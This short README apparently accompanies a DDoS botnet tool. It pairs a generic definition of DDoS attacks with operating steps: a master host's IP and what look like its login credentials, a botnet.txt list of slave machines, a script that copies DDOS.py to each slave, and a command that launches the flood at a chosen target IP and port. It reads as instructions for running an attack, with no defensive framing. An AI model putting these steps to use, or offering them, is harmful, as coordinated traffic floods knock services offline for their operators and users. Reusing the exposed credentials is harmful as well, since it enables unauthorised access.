#DDoS Attack
### What Is A DDos-Attack

### A Distributed Denial of Service (DDoS) attack is an attempt to make an online service unavailable
by overwhelming it with traffic from multiple sources. They target a wide
variety of important resourcesfrom banks to news websites, and present a major
challenge to making sure people can publish and access important information

#Master 10.7.3.26 sonicwall,sonicwall
#Slaves info in botnet.txt

1、Distribute DDOS.py to each slave if there is any change in DDOS.py; 
command: bash scp02.sh

2、DDOS Attack ; 
command: python Master.py --file botnet.txt --target-ip xx.xx.xx.xx --target-port xx

3、slave vms info in botnet.txt